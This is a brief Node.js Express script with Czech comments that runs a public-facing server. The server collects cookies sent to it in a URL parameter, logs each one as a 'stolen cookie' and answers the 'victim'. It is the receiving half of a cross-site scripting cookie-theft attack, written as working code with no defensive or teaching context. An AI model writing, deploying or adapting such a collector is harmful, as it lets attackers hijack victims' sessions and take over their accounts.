// Import Express.js
const express = require('express');
const app = express();

// Nastavení portu, na kterém server poběží
const port = 3000;

// Middleware pro zpracování URL parametrů (cookie)
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Route pro příjem cookies z URL
app.get('/', (req, res) => {
  if (req.query.cookie) {
    // Vytisknutí ukradené cookie do konzole
    console.log('Ukradená cookie:', req.query.cookie);
    
    // Odpověď pro oběť
    res.send('Cookies byly úspěšně přijaty.');
  } else {
    res.send('Nebyla zaslána žádná cookie.');
  }
});

// Spuštění serveru na specifikované IP adrese a portu
const ipAddress = '0.0.0.0'; // naslouchá na všech IP adresách (pro lokální i veřejné připojení)
app.listen(port, ipAddress, () => {
  console.log(`Server běží na http://0.0.0.0:${port} nebo na http://<vaše_ip_adresa>:${port}`);
});
